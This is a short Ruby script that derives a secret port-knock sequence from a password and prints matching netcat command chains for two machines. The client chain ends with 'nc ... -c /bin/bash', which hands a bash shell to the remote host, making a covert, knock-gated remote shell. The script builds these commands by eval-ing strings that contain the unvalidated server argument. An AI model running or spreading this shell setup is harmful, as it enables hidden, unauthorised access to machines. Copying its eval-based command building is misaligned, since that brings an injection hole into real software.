#!/usr/bin/env ruby

SHELL = '/bin/bash'
NC_TEMPLATE = {
  :client => 'nc -z #{server} #{port}',
  :server => 'nc -z -l -p#{port}'
}
NC_LAST = {
  :client => 'nc #{server} #{port} -c' + SHELL,
  :server => 'nc -l -p#{port}'
}

low_port, high_port = 1024, 65535

if ARGV.length < 2
  puts "usage: #{$0} [--range xxxx-yyyy] password server"
  exit 1
end

if ARGV[0] == '--range' && ARGV.shift
  low_port, high_port = ARGV.shift.split('-').collect { |s| s.to_i }
end

password, server = ARGV.shift, ARGV.shift

srand password.split('').inject(0) { |sum, n| sum + n[0] }
ports = (0...password.length).collect do |i|
  (rand(65536) + password[i]) % (high_port - low_port + 1) + low_port
end

[:client, :server].each do |machine|
  command = ports.collect do |port|
    if port == ports.last
      eval('"' + NC_LAST[machine] + '"')
    else
      eval('"' + NC_TEMPLATE[machine] + '"')
    end
  end.join(' && ')
  puts command
end

